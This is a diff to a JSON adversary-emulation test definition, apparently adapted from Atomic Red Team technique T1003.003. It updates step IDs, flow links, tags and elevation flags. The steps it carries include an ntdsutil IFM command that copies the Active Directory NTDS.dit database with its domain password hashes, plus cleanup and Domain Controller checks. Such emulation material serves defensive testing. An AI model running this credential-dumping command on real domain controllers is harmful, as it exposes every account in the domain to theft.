@@ -7,25 +7,25 @@
   ],
   "steps": [
     {
-      "id": "bc5efd67-e432-4145-95b1-b19f67de4584",
+      "id": "b2b5258a-edd8-4b2c-ae31-34012d41a533",
       "type": "execute-command",
       "data": {
         "command": "mkdir #{output_folder}\nntdsutil \"ac i ntds\" \"ifm\" \"create full #{output_folder}\" q q\n",
         "command_type": "command_prompt"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "49c9e692-a912-4827-bfdd-4ae17a5288ba",
+      "id": "1df4b4d5-96f1-4971-a45e-07827c43c72d",
       "type": "execute-command",
       "data": {
         "command": "rmdir /q /s #{output_folder} \u003enul 2\u003e\u00261\n",
         "command_type": "command_prompt"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "f6e2c525-015e-425d-a2a1-a8a869d43606",
+      "id": "26b78690-d4ae-4069-972b-51c5faef7e8b",
       "name": "Check dependency 1/1",
       "description": "Target must be a Domain Controller\n",
       "type": "execute-command",
@@ -33,10 +33,10 @@
         "command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "a9577a2b-c664-4157-a5bc-7e7ac43bf143",
+      "id": "dab141cf-60f2-4fdc-8537-721b509e5e1e",
       "name": "Resolve dependency 1/1",
       "description": "Target must be a Domain Controller\n",
       "type": "execute-command",
@@ -44,10 +44,10 @@
         "command": "echo Sorry, Promoting this machine to a Domain Controller must be done manually\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "e85c5b06-749b-4b26-9399-c4cbfc31dc55",
+      "id": "2af0c9df-18e6-4148-baa1-c8f241862a80",
       "name": "Re-check dependency 1/1",
       "description": "Target must be a Domain Controller\n",
       "type": "execute-command",
@@ -55,44 +55,44 @@
         "command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "bc5efd67-e432-4145-95b1-b19f67de4584",
+      "s": "b2b5258a-edd8-4b2c-ae31-34012d41a533",
       "p": "on-success",
-      "o": "49c9e692-a912-4827-bfdd-4ae17a5288ba"
+      "o": "1df4b4d5-96f1-4971-a45e-07827c43c72d"
     },
     {
-      "s": "bc5efd67-e432-4145-95b1-b19f67de4584",
+      "s": "b2b5258a-edd8-4b2c-ae31-34012d41a533",
       "p": "on-failure",
-      "o": "49c9e692-a912-4827-bfdd-4ae17a5288ba"
+      "o": "1df4b4d5-96f1-4971-a45e-07827c43c72d"
     },
     {
-      "s": "f6e2c525-015e-425d-a2a1-a8a869d43606",
+      "s": "26b78690-d4ae-4069-972b-51c5faef7e8b",
       "p": "on-success",
-      "o": "bc5efd67-e432-4145-95b1-b19f67de4584"
+      "o": "b2b5258a-edd8-4b2c-ae31-34012d41a533"
     },
     {
-      "s": "f6e2c525-015e-425d-a2a1-a8a869d43606",
+      "s": "26b78690-d4ae-4069-972b-51c5faef7e8b",
       "p": "on-failure",
-      "o": "a9577a2b-c664-4157-a5bc-7e7ac43bf143"
+      "o": "dab141cf-60f2-4fdc-8537-721b509e5e1e"
     },
     {
-      "s": "a9577a2b-c664-4157-a5bc-7e7ac43bf143",
+      "s": "dab141cf-60f2-4fdc-8537-721b509e5e1e",
       "p": "on-success",
-      "o": "e85c5b06-749b-4b26-9399-c4cbfc31dc55"
+      "o": "2af0c9df-18e6-4148-baa1-c8f241862a80"
     },
     {
-      "s": "e85c5b06-749b-4b26-9399-c4cbfc31dc55",
+      "s": "2af0c9df-18e6-4148-baa1-c8f241862a80",
       "p": "on-failure",
-      "o": "bc5efd67-e432-4145-95b1-b19f67de4584"
+      "o": "b2b5258a-edd8-4b2c-ae31-34012d41a533"
     }
   ],
   "tags": [
-    "T1003.003",
-    "atomic-red-team"
+    "T1003",
+    "T1003.003"
   ],
   "input_arguments": [
     {
